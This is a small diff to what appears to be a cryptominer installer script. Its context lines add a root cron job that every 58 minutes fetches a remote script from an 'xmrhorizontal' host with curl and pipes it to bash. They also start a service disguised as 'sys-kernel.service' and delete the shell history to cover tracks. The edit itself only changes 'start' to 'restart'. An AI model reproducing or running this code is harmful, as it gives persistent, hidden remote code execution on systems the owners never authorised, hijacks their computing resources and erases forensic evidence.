@@ -9,7 +9,7 @@ if [ ! -f /etc/cron.d/cronextend ]; then
  	chmod +x /bin/cpuhp
 	echo "*/58 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
  	systemctl daemon-reload
-	systemctl start sys-kernel.service
+	systemctl restart sys-kernel.service
         rm -f ~/.bash_history
         rm -f /root/.bash_history
 fi
